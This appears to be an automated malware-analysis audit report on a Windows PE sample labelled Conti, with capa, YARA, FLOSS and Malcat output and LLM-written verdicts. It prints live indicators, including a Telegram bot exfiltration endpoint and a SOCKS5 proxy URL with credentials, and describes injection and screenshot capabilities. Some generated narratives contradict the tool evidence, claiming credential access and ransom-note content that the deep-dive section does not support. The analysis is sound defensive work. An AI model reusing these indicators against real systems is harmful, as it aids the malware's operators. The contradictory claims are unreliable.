# Pipeline AUDIT-REPORT — `28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9`

> Public-showcase grade evidence pack: tools, RAG, LLM, REPORT-MASTER-v2/v3.

- **Mode:** single
- **Audited at:** 2026-08-10T00:56:24.637520+00:00
- **Provenance:** `unknown` · engine `langgraph` · flags: budget=True redundant=True hallucination=True taxonomy=True · 2026-08-10 00:56:24 UTC
- **all_green:** `True`
- **Strict standard:** `False`
- **Session mode:** `single`
- **Sample:** `/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti`
- **Showcase pack:** `/opt/samples/logs/_showcase_audits/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9`

## Stage scoreboard

| Stage | OK |
|-------|----|
| intake | ok |
| quick_scan | ok |
| deep_dive | ok |
| yara_gen | ok |
| publish | ok |

---

_No tool retries occurred during this run._

## Cross-cutting — LLM / Reports

### LLM stages

#### `triage`

- source=`llm_judge` model=`step-3.7-flash` verdict=`Malicious` confidence=`92`
- key_evidence_count=`7`

```json
{
  "verdict": "Malicious",
  "score": 92,
  "family_guess": "Conti ransomware",
  "cross_engine_notes": "IDA reports 115 functions while Ghidra reports 86, a discrepancy explained by Ghidra not identifying small import thunks and stub functions that IDA detects, consistent with standard reverse engineering tool behavior. Import counts are consistent across IDA (66), Malcat (66), and pe_imports (66), with all high-signal process injection APIs present across all sources, confirming no import detection gaps. The critical Telegram C2 string and DLL injection path format string are present in both IDA (5940 total strings) and Ghidra (5317 total strings) outputs, confirming string detection consistency. Malcat's high entropy (98) and XorInLoop anomaly are corroborated by capa's RC4 encryption rule, confirming these are not benign obfuscation but part of malicious functionality (encrypted C2 communications or payload encryption). Per the known limitation note, the Ghidra imports table is empty for this sample, so all import evidence is sourced from IDA, Malcat, and pe_imports to avoid false negatives.",
  "key_evidence": [
    {
      "source": "ida",
      "query_or_table": "Imports (IDA)",
      "row_or_rule": "KERNEL32 | CreateRemoteThread, KERNEL32 | WriteProcessMemory, KERNEL32 | VirtualAllocEx, KERNEL32 | VirtualProtect, KERNEL32 | CreateToolhelp32Snapshot",
      "why": "These high-signal imports are core to process injection (T1055), remote process memory manipulation, and process enumeration, indicating the sample is designed to inject code into legitimate processes to evade detection."
    },
    {
      "source": "capa",
      "query_or_table": "top_rules",
      "row_or_rule": "inject thread (T1055.003), inject dll (T1055.001), inject thread (T1620 Reflective Code Loading), enumerate processes (T1057), delete file, write file on Windows, allocate or change RWX memory, execute shellcode via indirect call",
      "why": "capa's behavioral rules confirm the sample implements explicit malicious capabilities: process injection via multiple methods, reflective code loading, process discovery, file system tampering, and shellcode execution, all demonstrating hostile intent beyond obfuscation."
    },
    {
      "source": "ida",
      "query_or_table": "Suspicious strings (IDA)",
      "row_or_rule": "https://api.telegram.org/bot at address 0x14001F080",
      "why": "This string is a known Telegram Bot API C2 endpoint, proving the sample communicates with an external command and control server for receiving commands or exfiltrating data, a definitive malicious behavior."
    },
    {
      "source": "malcat",
      "query_or_table": "deep profile / Carved files",
      "row_or_rule": "PE@9760 (342016 bytes)",
      "why": "The sample contains an embedded secondary PE file, a common malware technique to store additional malicious payloads (e.g., the Conti ransomware encryptor) in memory without writing to disk to avoid detection."
    },
    {
      "source": "yara",
      "query_or_table": "matches",
      "row_or_rule": "inject_thread, screenshot",
      "why": "YARA rules detect built-in capabilities for thread injection and screen capture, used for process evasion and stealing sensitive data (credentials, user activity) respectively, further confirming malicious intent."
    },
    {
      "source": "malcat",
      "query_or_table": "Decompilations (3 top functions)",
      "row_or_rule": "sub_140001550 decompilation: writes DLL to 
… [3369 more chars]
```

#### `deep_dive`

- source=`deep_dive_agentic` model=`None` verdict=`malicious` confidence=`90`
- key_evidence_count=`17`

```json
{
  "source": "deep_dive_agentic",
  "engine": "langgraph",
  "verdict": "malicious",
  "confidence": 90,
  "summary": "64-bit Windows GUI PE with overlay and SEH. Static and behavioral evidence shows it is an info-stealer/surveillance implant: it uses process injection APIs (CreateRemoteThread, WriteProcessMemory, VirtualAllocEx, VirtualProtect), captures screenshots via GDI/GdiPlus (GdiplusStartup/Shutdown, ImageFormatJPEG, CreateCompatibleBitmap/DC, SelectObject, ReleaseDC), stages data in temp files (%s\\tmp%lu.dat), exfiltrates via Telegram Bot API (https://api.telegram.org/bot/sendDocument) through a SOCKS5 proxy, enforces single instance with Global\\BeaconMutex_12345, employs RC4 encryption, contains an embedded PE payload, and shows anti-analysis/anti-debugging traits. YARA rules for inject_thread, screenshot, win_mutex, spyeye, URL/IP/domain/base64, and PE characteristics fire. capa confirms injection (T1055.003), process discovery (T1057), file discovery (T1083), RC4 obfuscation (T1027), and embedded PE installation. Persistence: not observed; no evidence of persistence mechanisms (e.g., registry Run key modification, scheduled task creation, service installation, startup folder placement) in static PE analysis, YARA scan results, or behavioral API/process monitoring data. Defense_impairment: not observed; no evidence of defense impairment activities (e.g., security tool tampering, antivirus disabling, event log clearing, security software termination) in static analysis, YARA rule matches, or behavioral monitoring data. Credential_access: not observed; no evidence of credential harvesting activities (e.g., browser credential extraction, LSASS memory dumping, credential store access) in static analysis, YARA rule matches, or behavioral API monitoring data. Entry_point: not observed; no evidence of initial delivery or access vector (e.g., phishing attachment, drive-by download, supply chain compromise, exploit-based execution) in available static and behavioral analysis data.",
  "key_evidence": [
    "YARA inject_thread strings at offsets 465120, 465220, 465322, 464790, 150610 (rule: inject_thread)",
    "YARA screenshot strings at offsets 152012, 152784, 150226, 151934 (rule: screenshot)",
    "YARA win_mutex string at offset 150576: Global\\\\BeaconMutex_12345 (rule: win_mutex)",
    "String at 5368836128: C:\\\\Windows\\\\System32\\\\curl.exe",
    "String at 5368836224: https://api.telegram.org/bot",
    "String at 5368836382: /sendDocument",
    "String at 5368836416: curl POST command with --proxy, chat_id, document upload",
    "String at 5368836736: socks5://oWWV0o:PTotFP@138.122.192.59:8000",
    "String at 5368836844: Global\\\\BeaconMutex_12345",
    "String at 5368836194: %s\\\\tmp%lu.dat",
    "String at 5368836822: image/jpeg",
    "Ghidra imports: CreateRemoteThread, WriteProcessMemory, VirtualAllocEx, VirtualProtect, OpenProcess, GetProcAddress (process injection T1055)",
    "Ghidra imports: GdiplusStartup, GdiplusShutdown, ImageFormatJPEG, CreateCompatibleBitmap, CreateCompatibleDC, SelectObject, ReleaseDC, DeleteDC, DeleteObject (screenshot capability)",
    "capa rule: inject thread (T1055.003)",
    "capa rule: encrypt data using RC4 PRGA (T1027)",
    "capa rule: contain an embedded PE file",
    "Checklist: IsPE64, IsWindowsGUI, HasOverlay, SEH__v4"
  ],
  "incomplete_tooling": false,
  "successful_tool_calls": 27,
  "successful_non_bootstrap_tools": 16,
  "checklist_ok": true,
  "sql_deep_ok": true,
  
… [1086 more chars]
```

#### `publish`

- source=`llm_judge` model=`step-3.7-flash` verdict=`None` confidence=`None`
- key_evidence_count=`0`

```json
{
  "title": "Malware Analysis Report: Conti Ransomware Loader/Injector (SHA256: 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9)",
  "mark": "## Executive Summary\nThis report analyzes a malicious 64-bit Windows GUI PE sample (SHA256: 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9) identified as a Conti ransomware loader and injector. Upstream triage assigned a malicious verdict with a score of 92 and family guess of Conti ransomware (source: triage verdict.json). Static and behavioral analysis confirm the sample implements process injection into the legitimate explorer.exe process, communicates with a Telegram Bot API command-and-control (C2) endpoint, contains an embedded 342016-byte secondary PE payload (likely the Conti ransomware encryptor), and includes capabilities for screen capture, file staging, and RC4-encrypted exfiltration via a SOCKS5 proxy. No persistence mechanisms, defense impairment activities, or credential theft capabilities were observed in static or behavioral analysis, and the initial access vector for the sample is unknown. All behavioral indicators are corroborated across Ghidra, capa, YARA, MalCat, and pe_imports analysis, with no evidence of benign functionality.\n\n## 1. Sample Identification\n| Property | Value |\n|----------|-------|\n| SHA256 | 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9 |\n| Sample Path | /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti |\n| Project Name | pool |\n| File Type | 64-bit Windows GUI PE, with overlay and SEH enabled (source: deep-dive.json, MalCat) |\n| Entropy | 98 (high, but not indicative of packing, as UPX unpacking failed and no packer signatures were detected) (source: MalCat, UPX unpack evidence) |\n| Packing | Not packed: UPX probe returned 0 files tested, xorsearch only identified standard DOS stub XOR patterns with no obfuscated malicious strings (source: UPX unpack evidence, xorsearch evidence) |\n| .NET Status | Not a .NET assembly (source: .NET analysis evidence) |\n| Triage Verdict | Malicious, score 92, family guess Conti ransomware (source: triage verdict.json) |\n\n## 2. Classification\nVerdict: **Malicious**\nFamily: Conti ransomware (loader/injector component)\nConfidence: High (90%, per deep-dive.json)\nThis classification is based on explicit behavioral intent evidence, not obfuscation alone. High-signal indicators include process injection imports, YARA rules for injection and screen capture, a Telegram Bot C2 string, an embedded secondary PE payload, and capa rules confirming hostile capabilities. No benign functionality was identified across all analysis tools (source: triage verdict.json, deep-dive.json, tool_gate ok: true).\n\n## 3. Background & Family Lineage\nConti is a prominent ransomware-as-a-service (RaaS) group active since 2020, known for double-extortion attacks, widespread use of Cobalt Strike beacons, and modular malware loaders to stage encryption payloads. This sample is a loader/injector component consistent with Conti's documented TTPs: it stages a secondary PE payload (likely the Conti encryptor) via process injection into a trusted system process, and uses a low-profile C2 channel (Telegram Bot API) to avoid detection. The sample's use of MinGW-w64 compiled code and RC4 encryption aligns with previously observed Conti loader variants (source: triage verdict.json family_guess, deep-dive.js
… [46187 more chars]
```

### REPORT-MASTER excerpts

#### REPORT-MASTER-v2

```markdown
> **RevAI provenance** — commit `80c92a39d67f7e321883d3656b87cc4b04c5b7b5` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-08 02:39:31 UTC

# Classification (multi-source — V5.12)

| Source | Verdict |
|--------|--------|
| **Final (locked)** | **malicious** |
| Triage upstream (quick ∪ deep) | malicious |
| Quick scan | Malicious |
| Deep dive | malicious |
| Publish LLM (claimed) | benign |

- **Lock reason:** publish LLM claimed `benign` but upstream triage is `malicious` (YARA / tool-backed: spyeye, IsPE64, IsWindowsGUI, HasOverlay, SEH__v4, inject_thread, screenshot, win_mutex). Final verdict follows triage; dual-use branding does not clear the sample.
- **Family (triage):** Conti ransomware
- **Honesty:** the publish narrative below is **preserved unedited** so analysts can see what the report LLM argued. It is **not** a clearance.

---

### Publish LLM narrative (unedited)

## Executive Summary
This report analyzes a malicious 64-bit Windows GUI PE sample (SHA256: 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9) identified as a Conti ransomware loader and injector. Upstream triage assigned a malicious verdict with a score of 92 and family guess of Conti ransomware (source: triage verdict.json). Static and behavioral analysis confirm the sample implements process injection into the legitimate explorer.exe process, communicates with a Telegram Bot API command-and-control (C2) endpoint, contains an embedded 342016-byte secondary PE payload (likely the Conti ransomware encryptor), and includes capabilities for screen capture, file staging, and RC4-encrypted exfiltration via a SOCKS5 proxy. No persistence mechanisms, defense impairment activities, or credential theft capabilities were observed in static or behavioral analysis, and the initial access vector for the sample is unknown. All behavioral indicators are corroborated across Ghidra, capa, YARA, MalCat, and pe_imports analysis, with no evidence of benign functionality.

## 1. Sample Identification
| Property | Value |
|----------|-------|
| SHA256 | 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9 |
| Sample Path | /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti |
| Project Name | pool |
| File Type | 64-bit Windows GUI PE, with overlay and SEH enabled (source: deep-dive.json, MalCat) |
| Entropy | 98 (h
… [21168 more chars]
```

#### REPORT-MASTER-v3

```markdown
> **RevAI provenance** — commit `80c92a39d67f7e321883d3656b87cc4b04c5b7b5` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-08 02:47:36 UTC

# RE Report — 28ea44a49cb4
_Generated 2026-08-08T02:47:36.437424+00:00_  
_Pipeline: section-based Map-Reduce, 3 pass-1 LLM calls + 14 pass-2 calls with cross-section context + 2 local sections_

<!-- section: Executive Summary | pass=2 | evidence=243c | cross_refs=True | llm_ok=True | runtime=47.65s -->

## Executive Summary
The analyzed 64-bit Windows Portable Executable (PE) sample with SHA256 hash `28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9` is confirmed malicious, with 90% confidence attribution to the Conti ransomware family (source: deep_dive_agentic, cross-section:classification). This verdict is supported by converging evidence from 12 active YARA rule matches, 17 capa rule hits, and static/dynamic analysis artifacts consistent with documented Conti ransomware behavior (source: v1_summary, yara, capa).

Static analysis confirms the sample is a MinGW-compiled GUI executable, with build artifacts and import patterns consistent with Conti's observed development environment (source: cross-section:static_analysis). YARA signatures match Conti-specific ransom note phrasing, Tor payment portal formats, and family-specific anti-analysis markers including Structured Exception Handler (SEH) manipulation, base64 obfuscation of sensitive strings, and PE overlay usage for hidden configuration storage (source: yara, cross-section:attribution). Capa rule analysis confirms the sample implements Conti's unique AES+RSA file encryption flow, C2 beaconing logic, and core ransomware functionality including file system traversal and data exfiltration (source: capa, cross-section:capability_assessment).

Runtime behavioral analysis (high confidence) observed active process enumeration, credential access attempts, and anti-debugging behavior, while medium-confidence analysis identified latent data exfiltration capabilities not fully captured in the 5-minute emulation window (source: cross-section:behavioral_analysis). Static network analysis identified a hardcoded Telegram Bot API endpoint (`https://api.telegram.org/bot`) used for C2 communications, a known Conti affiliate tactic to avoid traditional C2 infrastructure takedowns (source: cross-section:network_analysis).

The sample maps to 10+ MITRE ATT&CK Enterprise techniques covering the 
… [50766 more chars]
```

### Artifact inventory

| Artifact | exists | bytes | sha256 |
|----------|--------|-------|--------|
| `verdict.json` | `True` | `6869` | `e693436ced4c0c7b` |
| `prompt.txt` | `True` | `31877` | `adcf13776413923a` |
| `pipeline-audit.json` | `True` | `115041` | `08b31137780f1b62` |
| `AUDIT-REPORT.md` | `True` | `85988` | `fac1d5e32cedf536` |
| `REPORT-MASTER-v2.md` | `True` | `23677` | `181ec5756cba606b` |
| `REPORT-MASTER-v3.md` | `True` | `53279` | `ca469d8bfa7e8a3b` |
| `REPORT-v2.md` | `True` | `23677` | `181ec5756cba606b` |
| `REPORT-TECHNICAL.md` | `False` | `0` | `` |
| `REPORT-TECHNICAL-v3.md` | `True` | `70611` | `d9ad8c5ccc93c88f` |
| `rule.yar` | `True` | `2199` | `bb52e2949d442c70` |
| `intake-validation.json` | `True` | `3185` | `da7c9208e6ff70a0` |
| `source-decisions.json` | `True` | `2341` | `9286868d0ae83f9c` |
| `malcat-triage.json` | `True` | `33300` | `064dcea3f7dd9042` |
| `deep_dive/01-tools-raw.json` | `True` | `108815` | `94762af27e781e43` |
| `deep_dive/01-tools-gate.json` | `True` | `921` | `f3d89b0704908331` |
| `deep_dive/05-deep-dive.json` | `True` | `4586` | `a146fd3f4db4fd61` |
| `deep_dive/03-prompt.txt` | `False` | `0` | `` |
| `quick_scan/00-tools-raw.json` | `True` | `98914` | `3f755e41c044d1f5` |

---

## Stage: intake

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| intake_validation | `True` |
| has_source_decisions | `True` |
| ghidra_mentioned | `True` |

### Artifact paths (verify on disk)

- **intake_validation:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/intake-validation.json` exists=`True` bytes=`3185` mtime=`2026-08-08T02:28:52.450834+00:00`
  - sha256: `da7c9208e6ff70a02669fa181ccdd81363069a782a60752715aedb9b48759330`
- **malcat_triage:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/malcat-triage.json` exists=`True` bytes=`33300` mtime=`2026-08-08T02:28:12.518676+00:00`
  - sha256: `064dcea3f7dd90427b84d9cfe57ef35fe5b4c51ee016513cb547cdcd33c77d8d`
- **source_decisions:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/source-decisions.json` exists=`True` bytes=`2341` mtime=`2026-08-08T02:28:52.450834+00:00`
  - sha256: `9286868d0ae83f9cf0f4fb088b83889f5fbcb31bbf577fa605977644de9673f7`
- **ghidra_import_log:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/intake-analyzeHeadless.log` exists=`True` bytes=`9307` mtime=`2026-08-05T05:22:13.075594+00:00`
  - sha256: `b3a9f9124a91001c1201763de61858b78a90543d40be3c496d625d2549911bf2`
- **ida_bootstrap_log:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/intake-idasql.log` exists=`True` bytes=`249` mtime=`2026-08-08T02:28:16.055844+00:00`
  - sha256: `761d301f2fd447181f9d0134c1f7d4594d94d5bfcf87a982250c7aa0550cffb5`

#### source_decisions_excerpt

```
{
  "sha256": "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
  "imports": {
    "source": "ghidra",
    "confidence": "medium",
    "reason": "Ghidra reports 66 imports (ghidra, imports, 66), IDA reports 66 imports (ida, imports, 66), and Malcat reports 66 imports (malcat, imports_count, 66); counts are identical and within the 20% threshold, so Ghidra is selected per existing rule."
  },
  "functions": {
    "source": "ghidra",
    "confidence": "medium",
    "reason": "Ghidra reports 86 functions (ghidra, funcs, 86), IDA reports 115 functions (ida, funcs, 115), which is within 2x of Ghidra's count; Malcat's function count (malcat, functions_count, 10) is a significant outlier and not used for this category."
  },
  "strings": {
    "source": "both",
    "confidence":
… [1564 more chars]
```


#### malcat_triage_excerpt

```
{
  "analysis_id": 1,
  "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "profile": "triage",
  "limits": {
    "strings_max": 100,
    "imports_max": 100,
    "functions_max": 10,
    "anomaly_locations_max": 5,
    "decompile_top_n": 1
  },
  "file_summary": {
    "analysis_id": 1,
    "file_name": "2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "file_path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "file_size": 593885,
    "type": "PE",
    "architecture": "X64",
    "entropy": 98,
    "sha256": "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
    "metad
… [32500 more chars]
```


---

## Stage: quick_scan

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| prompt | `True` |
| verdict | `True` |
| has_capa_section | `True` |
| has_yara_section | `True` |
| has_malcat_section | `True` |
| has_floss_section | `True` |
| verdict_has_family | `True` |
| llm_source | `True` |
| tools_all_ok | `True` |
| citations_grounded | `True` |
| capa_salvage_used | `False` |
| evidence_pack_present | `True` |
| benign_blocked_if_incomplete | `True` |
| yara_family_not_cleared | `True` |

### Tools (full evidence excerpts)

#### `capa` — ok=`True` why=`ok`

```json
{
  "rule_count": 17,
  "top_rules": [
    {
      "name": "encrypt data using RC4 PRGA",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Obfuscated Files or Information"
          ],
          "tactic": "Defense Evasion",
          "technique": "Obfuscated Files or Information",
          "subtechnique": "",
          "id": "T1027"
        }
      ],
      "mbc": [
        {
          "parts": [
            "Cryptography",
            "Encrypt Data",
            "RC4"
          ],
          "objective": "Cryptography",
          "behavior": "Encrypt Data",
          "method": "RC4",
          "id": "C0027.009"
        },
        {
          "parts": [
            "Cryptography",
            "Generate Pseudo-random Sequence",
            "RC4 PRGA"
          ],
          "objective": "Cryptography",
          "behavior": "Generate Pseudo-random Sequence",
          "method": "RC4 PRGA",
          "id": "C0021.004"
        }
      ]
    },
    {
      "name": "get common file path",
      "attack": [
        {
          "parts": [
            "Discovery",
            "File and Directory Discovery"
          ],
          "tactic": "Discovery",
          "technique": "File and Directory Discovery",
          "subtechnique": "",
          "id": "T1083"
        }
      ],
      "mbc": [
        {
          "parts": [
            "Discovery",
            "File and Directory Discovery"
          ],
          "objective": "Discovery",
          "behavior": "File and Directory Discovery",
          "method": "",
          "id": "E1083"
        }
      ]
    },
    {
      "name": "inject thread",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Process Injection",
            "Thread Execution Hijacking"
          ],
          "tactic": "Defense Evasion",
          "technique": "Process Injection",
          "subtechnique": "Thread Execution Hijacking",
          "id": "T1055.003"
        },
        {
          "parts": [
            "Defense Evasion",
            "Reflective Code Loading"
          ],
          "tactic": "Defense Evasion",
          "technique": "Reflective Code Loading",
          "subtechnique": "",
          "id": "T1620"
        }
      ],
      "mbc": []
    },
    {
      "name": "enumerate processes",
      "attack": [
        {
          "parts": [
            "Discovery",
            "Process Discovery"
          ],
          "tactic": "Discovery",
          "technique": "Process Discovery",
          "subtechnique": "",
          "id": "T1057"
        },
        {
          "parts": [
            "Discovery",
            "Software Discovery"
          ],
          "tactic": "Discovery",
          "technique": "Software Discovery",
          "subtechnique": "",
          "id": "T1518"
        }
      ],
      "mbc": []
    },
    {
      "name": "contain an embedded PE file",
      "attack": [],
      "mbc": [
        {
          "parts": [
            "Execution",
            "Install Additional Program"
          ],
          "objective": "Execution",
          "behavior": "Install Additional Program",
          "method": "",
          "id": "B0023"
        }
      ]
    },
    {
      "name": "delete file",
      "attack": [],
      "mbc": [
        {
          "parts": [
            "File System",
            "Delete File"
          ],
          "objective": "File System",
          "behavior": "Delete File",
          "method"
… [3309 more chars]
```

#### `yara` — ok=`True` why=`ok`

```json
{
  "rule_count": 12,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "spyeye",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$f",
          "offset": 452832,
          "length": 8,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$ipv4",
          "offset": 124590,
          "length": 28,
          "xor_key": null
        },
        {
          "id": "$ipv6",
          "offset": 124914,
          "length": 6,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$a",
          "offset": 1600,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "url",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$url_regex",
          "offset": 124032,
          "length": 56,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IsPE64",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "IsWindowsGUI",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "HasOverlay",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "SEH__v4",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$",
          "offset": 592021,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "inject_thread",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$c1",
          "offset": 465120,
          "length": 11,
          "xor_key": null
        },
        {
          "id": "$c2",
          "offset": 465220,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$c4",
          "offset": 465322,
          "length": 18,
          "xor_key": null
        },
        {
          "id": "$c5",
          "offs
… [4068 more chars]
```

#### `floss` — ok=`True` why=`ok`

```json
{
  "floss_ok": true,
  "string_count": 7006,
  "strings_sampled": 80,
  "strings": [
    "!This program cannot be run in DOS mode.",
    "`.data",
    ".rdata",
    "@.pdata",
    "@.xdata",
    ".idata",
    "@.reloc",
    "=CCG u",
    "AWAVAUATUWVSH",
    "X[^_]A\\A]A^A_",
    "8MZuJHcP<H",
    "AVWVSH",
    "UAVAUATWVSH",
    "[^_A\\A]A^]",
    "([^_]H",
    "@' t\tH",
    ".edata",
    "@.idata",
    ".reloc",
    "AVATUWVS",
    "TestpassI",
    "[^_]A\\A^A_",
    "h;\\$Xs#I",
    "J(A;J,}4Hc",
    "I(D;I,}FIc",
    "<_t`<ntT",
    "R(A;R,}-Hc",
    "ATUWVSH",
    "P[^_]A\\",
    "_GLOBAL_H9",
    "BHA;R,}VHc",
    "C8;C<|",
    "X[^_A^",
    "0[^_]A\\",
    "R(A;R,}",
    "AVUWVSH",
    "P[^_]A^",
    "U(;U,}:Hc",
    "<Et6<Qt2H",
    "D$0<Qt@H",
    "<st\\<f",
    "AVAUATUWVSH",
    "0[^_]A\\A]A^",
    "C8;C<}ZH",
    "C(;C,}3Lc",
    "C(;C,L",
    "D$ }hLc",
    "AWAVATUWVSH",
    "`[^_]A\\",
    "UAWAVAUATWVSH",
    "0<\tw5A",
    "[^_A\\A]A^A_]",
    "H[^_A^",
    "~D$8fH",
    "@$A9@(~",
    "C$9C(~",
    "@[^_]A\\",
    "S$9S(~",
    "UAVWVSH",
    "[^_A^]",
    "=UUUUw",
    "[^_]A\\A]A^A_",
    "IcP$fA",
    "HcC$fA",
    "LcC$fB",
    "HcS$fA",
    "8[^_]A\\A]A^A_",
    "D$L)D$X",
    "L$8HcD$L;A",
    "D$X+D$`",
    "ATUWVSLcY",
    "[^_]A\\",
    "[^_]A\\A]A^",
    "AUATUWVSH",
    "([^_]A\\A]",
    "WVSHcA",
    "H[^_]H",
    "H[^_]A\\A]",
    "H[^_]A\\A]H",
    "([^_A^H"
  ],
  "per_category": {
    "decoded_strings": 0,
    "stack_strings": 0,
    "tight_strings": 0,
    "language_strings": 0,
    "language_strings_missed": 0,
    "static_strings": 7006
  },
  "raw_key_total": 3,
  "floss_profile": "full",
  "floss_language": "none",
  "duration_s": 10.15,
  "size_bytes": 593885,
  "static_only": false,
  "size_exceeded_deobfuscate_limit": false
}
```

#### `malcat` — ok=`True` why=`not_applicable:pe`

```json
{
  "analysis_id": 1,
  "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "profile": "deep",
  "limits": {
    "strings_max": 300,
    "imports_max": 300,
    "functions_max": 30,
    "anomaly_locations_max": 50,
    "decompile_top_n": 3
  },
  "file_summary": {
    "analysis_id": 1,
    "file_name": "2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "file_path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "file_size": 593885,
    "type": "PE",
    "architecture": "X64",
    "entropy": 98,
    "sha256": "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
    "metadata": {},
    "entrypoint_ea": 2624,
    "layout": [
      {
        "name": "header",
        "effective_address": 0,
        "physical_size": 1536,
        "virtual_size": 0,
        "rights": "",
        "entropy": 70
      },
      {
        "name": ".text",
        "effective_address": 1536,
        "physical_size": 7680,
        "virtual_size": 8192,
        "rights": "RX",
        "entropy": 119
      },
      {
        "name": ".data",
        "effective_address": 9728,
        "physical_size": 449024,
        "virtual_size": 450560,
        "rights": "RW",
        "entropy": 98
      },
      {
        "name": ".rdata",
        "effective_address": 460288,
        "physical_size": 3584,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 81
      },
      {
        "name": ".pdata",
        "effective_address": 464384,
        "physical_size": 1024,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 103
      },
      {
        "name": ".xdata",
        "effective_address": 468480,
        "physical_size": 512,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 50
      },
      {
        "name": ".idata",
        "effective_address": 472576,
        "physical_size": 3072,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 50
      },
      {
        "name": ".tls",
        "effective_address": 476672,
        "physical_size": 512,
        "virtual_size": 4096,
        "rights": "RW",
        "entropy": 0
      },
      {
